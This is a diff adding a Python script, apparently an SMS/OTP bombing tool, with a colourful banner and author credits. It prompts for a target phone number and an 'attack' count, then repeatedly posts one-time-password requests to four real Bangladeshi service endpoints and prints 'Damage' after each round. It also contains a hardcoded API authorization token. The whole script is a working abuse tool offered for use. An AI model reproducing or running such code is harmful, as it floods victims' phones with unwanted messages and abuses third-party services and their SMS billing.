@@ -1,0 +1,123 @@
+
+# Bold High Intensty
+biblack="\033[1;90m"      # Black
+bired="\033[1;91m"        # Red
+bigreen="\033[1;92m"      # Green
+biyellow="\033[1;93m"     # Yellow
+biblue="\033[1;94m"       # Blue
+bipurple="\033[1;95m"     # Purple
+bicyan="\033[1;96m"       # Cyan
+biehite="\033[1;97m"      # White
+
+print(bigreen+"""
+   _______ _     _                              
+  |__   __| |   (_)                             
+     | |  | |__  _ ___                          
+     | |  | '_ \| / __|                         
+     | |  | | | | \__ \                         
+    _|_|_ |_| |_|_|___/_______   __  __         
+   / ____|            |__   __| |  \/  |        
+  | (___  _   _  ___  ___| | ___| \  / |        
+   \___ \| | | |/ _ \/ __| |/ _ \ |\/| |        
+   ____) | |_| |  __/\__ \ |  __/ |  | |        
+  |_____/ \__, |\___||___/_|\___|_|  |_|        
+   _____   __/ |______    _____                 
+  / ____| |___/__   __|  |  __ \                
+ | |     _ __ ___| | ___ | |__) |               
+ | |    | '__/ _ \ |/ _ \|  _  /                
+ | |____| | |  __/ | (_) | | \ \                
+  \_____|_|_ \___|_|\___/|_|  \_\               
+       |  _ \                                   
+       | |_) |_   _                             
+       |  _ <| | | |                            
+       | |_) | |_| |                            
+       |____/ \__, |                            
+               __/ |                            
+  _____       |___/_  _     _    _       _____  
+ |  __ \      |  __ \(_)   | |  | |     |  __ \ 
+ | |__) |___  | |__) |_ ___| |__| | __ _| |  | |
+ |  _  // __| |  _  /| / __|  __  |/ _` | |  | |
+ | | \ \\__ \ | | \ \| \__ \ |  | | (_| | |__| |
+ |_|  \_\___/ |_|  \_\_|___/_|  |_|\__,_|_____/ 
+                                                
+                                                
+""")
+
+
+print ("	 -!-!- WeLcOmE-!-!- ( Rs-RisHaD ) ( RisHaDSoBoJ ) ")
+
+
+print ("""
+
+
+   ╔═════════════════════════════════╗
+   ║ AuTHor   : RiisHaD ツ           ║
+   ║ FaCeBooK : iTzRiisHaD           ║
+   ║ GitHuB   : iTzRisHaD            ║
+   ╚═════════════════════════════════╝
+
+
+
+
+""")
+
+
+
+
+
+
+import requests
+from requests.structures import CaseInsensitiveDict
+number  = str(input("[>] Heii Mr : RisHaD Sir. apNar aTTack NumBer DiN: "))
+
+
+amount = int(input("[>] RisHaD Sir apNar aTTack ar PoriMaN LikHuN: "))
+
+
+
+url = "https://shopup.com.bd/users/send_user_otp.json"
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/json"
+
+data = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'
+url1 = "http://nesco.sslwireless.com:80/api/v1/login"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone_number="+number
+
+
+url2 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers2 = CaseInsensitiveDict()
+
+headers2["Content-Length"]="48"
+
+headers2["Content-Type"]="application/json;charset=utf-8"
+
+data2 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+
+
+
+
+url3 = "https://prodapi.swap.com.bd/api/v1/send-otp/login"
+
+headers3 = CaseInsensitiveDict()
+
+headers3["X-Authorization"]= "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3"
+
+headers3["Content-Type"] = "application/json"
+
+data3 = '{"mobile_number":"'+number+'","referral":false}'
+for i in range(amount):
+	resp = requests.post(url, headers=headers, data=data)
+	resp1 = requests.post(url1, headers=headers1, data=data1)
+	resp2 = requests.post(url2, headers=headers2, data=data2)
+	resp3 = requests.post(url3, headers=headers3, data=data3)
+	print(str (i+1)+" Damage \n")
